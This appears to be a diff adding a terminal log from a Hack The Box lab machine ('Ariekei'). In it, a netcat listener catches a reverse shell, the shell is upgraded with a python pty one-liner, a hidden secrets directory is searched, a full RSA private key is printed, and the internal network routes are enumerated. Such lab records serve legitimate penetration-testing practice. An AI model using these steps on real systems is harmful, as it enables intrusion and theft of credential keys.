@@ -1,0 +1,127 @@
+root@parrot:~/hackthebox/ariekei# nc -nvlp 443                                  
+Ncat: Version 7.80 ( https://nmap.org/ncat )                                    
+Ncat: Listening on :::443               
+Ncat: Listening on 0.0.0.0:443          
+^C                                      
+root@parrot:~/hackthebox/ariekei# nc -nvlp 443                                  
+Ncat: Version 7.80 ( https://nmap.org/ncat )                                    
+Ncat: Listening on :::443               
+Ncat: Listening on 0.0.0.0:443          
+Ncat: Connection from 10.10.10.65.      
+Ncat: Connection from 10.10.10.65:53870.                                        
+bash: cannot set terminal process group (-1): Inappropriate ioctl for device    
+bash: no job control in this shell      
+[root@calvin app]# ls                   
+ls                                      
+app.py                                  
+converted                               
+requirements.txt                        
+uploads                                 
+[root@calvin app]# python -c "import pty; pty.spawn('/bin/bash')"               
+python -c "import pty; pty.spawn('/bin/bash')"                                  
+[root@calvin app]# cd /proc/net         
+cd /proc/net                            
+[root@calvin net]# ls                   
+ls                                      
+anycast6      igmp6               ip_tables_targets  raw           stat         
+arp           ip6_flowlabel       ipv6_route         raw6          tcp          
+dev           ip6_mr_cache        mcfilter           route         tcp6         
+dev_mcast     ip6_mr_vif          mcfilter6          rt6_stats     udp          
+dev_snmp6     ip6_tables_matches  netfilter          rt_acct       udp6         
+fib_trie      ip6_tables_names    netlink            rt_cache      udplite      
+fib_triestat  ip6_tables_targets  netstat            snmp          udplite6     
+icmp          ip_mr_cache         packet             snmp6         unix         
+icmp6         ip_mr_vif           protocols          sockstat      wireless     
+if_inet6      ip_tables_matches   psched             sockstat6     xfrm_stat    
+igmp          ip_tables_names     ptype              softnet_stat               
+[root@calvin net]# cat fib_trie         
+cat_trie                                
+bash: cat_trie: command not found       
+[root@calvin net]# cd /common/.secrets/ 
+cd /common/.secrets/                    
+[root@calvin .secrets]# ls -la          
+ls -la                                  
+total 16                                
+drwxrwxr-x 2 root root 4096 Sep 24  2017 .                                      
+drwxr-xr-x 5 root root 4096 Sep 23  2017 ..                                     
+-r--r----- 1 root root 1679 Sep 23  2017 bastion_key                            
+-r--r----- 1 root root  393 Sep 23  2017 bastion_key.pub                        
+[root@calvin .secrets]# cat bastion_key 
+cat bastion_key                         
+-----BEGIN RSA PRIVATE KEY-----         
+MIIEpAIBAAKCAQEA8M2fLV0chunp+lPHeK/6C/36cdgMPldtrvHSYzZ0j/Y5cvkR                
+SZPGfmijBUyGCfqK48jMYnqjLcmHVTlA7wmpzJwoZj2yFqsOlM3Vfp5wa1kxP+JH                
+g0kZ/Io7NdLTz4gQww6akH9tV4oslHw9EZAJd4CZOocO8B31hIpUdSln5WzQJWrv                
+pXzPWDhS22KxZqSp2Yr6pA7bhD35yFQ7q0tgogwvqEvn5z9pxnCDHnPeYoj6SeDI                
+T723ZW/lAsVehaDbXoU/XImbpA9MSF2pMAMBpT5RUG80KqhIxIeZbb52iRukMz3y                
+5welIrPJLtDTQ4ra3gZtgWvbCfDaV4eOiIIYYQIDAQABAoIBAQDOIAUojLKVnfeG                
+K17tJR3SVBakir54QtiFz0Q7XurKLIeiricpJ1Da9fDN4WI/enKXZ1Pk3Ht//ylU                
+P00hENGDbwx58EfYdZZmtAcTesZabZ/lwmlarSGMdjsW6KAc3qkSfxa5qApNy947                
+QFn6BaTE4ZTIb8HOsqZuTQbcv5PK4v/x/Pe1JTucb6fYF9iT3A/pnXnLrN9AIFBK                
+/GB02ay3XDkTPh4HfgROHbkwwverzC78RzjMe8cG831TwWa+924u+Pug53GUOwet                
+A+nCVJSxHvgHuNA2b2oMfsuyS0i7NfPKumjO5hhfLex+SQKOzRXzRXX48LP8hDB0                
+G75JF/W9AoGBAPvGa7H0Wen3Yg8n1yehy6W8Iqek0KHR17EE4Tk4sjuDL0jiEkWl                
+WlzQp5Cg6YBtQoICugPSPjjRpu3GK6hI/sG9SGzGJVkgS4QIGUN1g3cP0AIFK08c                
+41xJOikN+oNInsb2RJ3zSHCsQgERHgMdfGZVQNYcKQz0lO+8U0lEEe1zAoGBAPTY                
+EWZlh+OMxGlLo4Um89cuUUutPbEaDuvcd5R85H9Ihag6DS5N3mhEjZE/XS27y7wS                
+3Q4ilYh8Twk6m4REMHeYwz4n0QZ8NH9n6TVxReDsgrBj2nMPVOQaji2xn4L7WYaJ                
+KImQ+AR9ykV2IlZ42LoyaIntX7IsRC2O/LbkJm3bAoGAFvFZ1vmBSAS29tKWlJH1                
+0MB4F/a43EYW9ZaQP3qfIzUtFeMj7xzGQzbwTgmbvYw3R0mgUcDS0rKoF3q7d7ZP                
+ILBy7RaRSLHcr8ddJfyLYkoallSKQcdMIJi7qAoSDeyMK209i3cj3sCTsy0wIvCI                
+6XpTUi92vit7du0eWcrOJ2kCgYAjrLvUTKThHeicYv3/b66FwuTrfuGHRYG5EhWG                
+WDA+74Ux/ste3M+0J5DtAeuEt2E3FRSKc7WP/nTRpm10dy8MrgB8tPZ62GwZyD0t                
+oUSKQkvEgbgZnblDxy7CL6hLQG5J8QAsEyhgFyf6uPzF1rPVZXTf6+tOna6NaNEf                
+oNyMkwKBgQCCCVKHRFC7na/8qMwuHEb6uRfsQV81pna5mLi55PV6RHxnoZ2wOdTA                
+jFhkdTVmzkkP62Yxd+DZ8RN+jOEs+cigpPjlhjeFJ+iN7mCZoA7UW/NeAR1GbjOe                
+BJBoz1pQBtLPQSGPaw+x7rHwgRMAj/LMLTI46fMFAWXB2AzaHHDNPg==                        
+-----END RSA PRIVATE KEY-----           
+[root@calvin .secrets]# cat bastion_key.pub                                     
+cat bastion_key.pub                     
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDwzZ8tXRyG6en6U8d4r/oL/fpx2Aw+V22u8dJjNnSP9jly+RFJk8Z+aKMFTIYJ+orjyMxieqMtyYdVOUDvCanMnChmPbIWqw6UzdV+nnBrWTE/4keDSRn8ijs10tPPiBDDDpqQf21XiiyUfD0RkAl3gJk6hw7wHfWEilR1KWflbNAlau+lfM9YOFLbYrFmpKnZivqkDtuEPfnIVDurS2CiDC+oS+fnP2nGcIMec95iiPpJ4MhPvbdlb+UCxV6FoNtehT9ciZukD0xIXakwAwGlPlFQbzQqqEjEh5ltvnaJG6QzPfLnB6Uis8ku0NNDitreBm2Ba9sJ8NpXh46Ighhh root@arieka          
+[root@calvin .secrets]# cat /proc/net/fib_trie                                  
+cat /proc/net/fib_trie                  
+Main:                                   
+  +-- 0.0.0.0/0 3 0 5                   
+     |-- 0.0.0.0                        
+        /0 universe UNICAST             
+     +-- 127.0.0.0/8 2 0 2              
+        +-- 127.0.0.0/31 1 0 0          
+           |-- 127.0.0.0                
+              /32 link BROADCAST        
+              /8 host LOCAL             
+           |-- 127.0.0.1                
+              /32 host LOCAL            
+        |-- 127.255.255.255             
+           /32 link BROADCAST           
+     +-- 172.23.0.0/24 2 0 2            
+        +-- 172.23.0.0/28 2 0 2         
+           |-- 172.23.0.0               
+              /32 link BROADCAST        
+              /24 link UNICAST          
+           |-- 172.23.0.11              
+              /32 host LOCAL            
+        |-- 172.23.0.255                
+           /32 link BROADCAST           
+Local:                                  
+  +-- 0.0.0.0/0 3 0 5                   
+     |-- 0.0.0.0                        
+        /0 universe UNICAST             
+     +-- 127.0.0.0/8 2 0 2              
+        +-- 127.0.0.0/31 1 0 0          
+           |-- 127.0.0.0                
+              /32 link BROADCAST        
+              /8 host LOCAL             
+           |-- 127.0.0.1                
+              /32 host LOCAL            
+        |-- 127.255.255.255             
+           /32 link BROADCAST           
+     +-- 172.23.0.0/24 2 0 2            
+        +-- 172.23.0.0/28 2 0 2         
+           |-- 172.23.0.0               
+              /32 link BROADCAST        
+              /24 link UNICAST          
+           |-- 172.23.0.11              
+              /32 host LOCAL            
+        |-- 172.23.0.255                
+           /32 link BROADCAST           
+[root@calvin .secrets]# exit            
